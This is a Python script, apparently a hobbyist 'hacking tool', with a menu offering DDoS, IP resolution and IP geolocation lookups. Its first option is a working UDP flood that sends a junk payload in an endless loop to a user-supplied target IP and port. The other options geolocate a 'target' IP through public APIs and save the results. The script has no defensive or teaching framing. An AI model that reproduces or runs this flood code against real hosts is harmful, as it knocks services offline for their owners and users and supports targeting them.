import requests,socket
r=requests.session()
gr="\033[1;32m";re="\033[1;31m";cy="\033[1;36m";do='\033[1;37m';so='\033[1;35m';po='\033[1;38m'
if gr==gr:
     print(f"{re} </> @TweakPY")
     print(f"""
       {gr}  ██╗░░░██╗██████╗░███████╗░░███╗░░
       {po}  ██║░░░██║╚════██╗██╔════╝░████║░░
       {re}  ╚██╗░██╔╝░░███╔═╝█████╗░░██╔██║░░
       {cy}  ░╚████╔╝░██╔══╝░░██╔══╝░░╚═╝██║░░
       {po}  ░░╚██╔╝░░███████╗██║░░░░░███████     
                """)
     print(f"""
     {gr}- {po}1*[DDOS]
     {gr}- {po}2*[GET IP ]
     {gr}- {po}3*[GET IP INFO]
     {gr}- {po}4*[GET IP FULL INFO ]
     {gr}- {po}99*[exit program]
     """)     
     mod=int(input("[+] Enter Number: "))
     if mod==1:
         global vv1ck
         print("======================================")
         print(f"{re}DDos Attack")
         print("======================================")        
         target=input(f"{po}[+] Enter Target IP: ")
         port1=input(f"{po}[+] Enter Port: ")
         target.replace("http://", "")
         target.replace("https://", "")
         target.replace("www.", "")
         ip=socket.gethostbyname(target)
         port=int(port1)
         vv1ck= "jlllllllllllllkkkkkkkkkkkkkkkkkkkkkkkjllllllllllllllllllllllllllllllllllllllllkkkkkkkkkkkkkkkkkkkkkklllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllllmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmskskskskskks"
         while True:
             sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             sock.sendto(bytes(vv1ck,"UTF-8"), (ip, port))
             print(port,f"{re}<======>", ip)             
     elif mod==2:         
         IPS=input('[+] Enter Site URL: ')
         sop=socket.gethostbyname(IPS)
         print(re+sop)
     elif mod==3:
        j=int(input(po+"""
         [1] Get My IP & data
         [2] Get Location & data From IP Target
         """))        
        if j==1:
            IPrequest=requests.get("https://get.geojs.io/v1/ip.json")
            myIP=IPrequest.json()["ip"]
            LocationR=requests.get("https://get.geojs.io/v1/ip/geo/" + myIP + ".json")
            GetLocate=LocationR.json()
            print(re+">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
            print("My IP Address      : " + GetLocate["ip"])
            print("My Location        : " + GetLocate["country"])
            print("My Country Code    : " + GetLocate["country_code"])
            print("Service Provider   : " + GetLocate["organization_name"])
            print("Time Zone          : " + GetLocate["timezone"])
            print("Longitude On a map : " + GetLocate["longitude"])
            print("Latitude On a map  : " + GetLocate["latitude"])
        elif j==2:        
            z=input("[+] Enter The IP ")
            LocationR=requests.get("https://get.geojs.io/v1/ip/geo/"+z+".json")
            GetLocate=LocationR.json()
            print(re+">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
            print("Target IP Address         : " + GetLocate["ip"])
            print("Target Location           : " + GetLocate["country"])
            print("Target Country Code       : " + GetLocate["country_code"])
            print("Target Time Zone          : " + GetLocate["timezone"])
            print("Target Longitude On a map : " + GetLocate["longitude"])
            print("Target Latitude On a map  : " + GetLocate["latitude"])
            print(">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>")
     elif mod==4:         
         ip=input("[>] IP : ")
         url=f'https://ipinfo.io/{ip}'
         req=requests.get(url)
         print(re+req.text)
         with open("IP_INFO.json", 'a') as x:
         	x.write(f'{req.text}')
     elif mod==99:quit(0)
else:pass
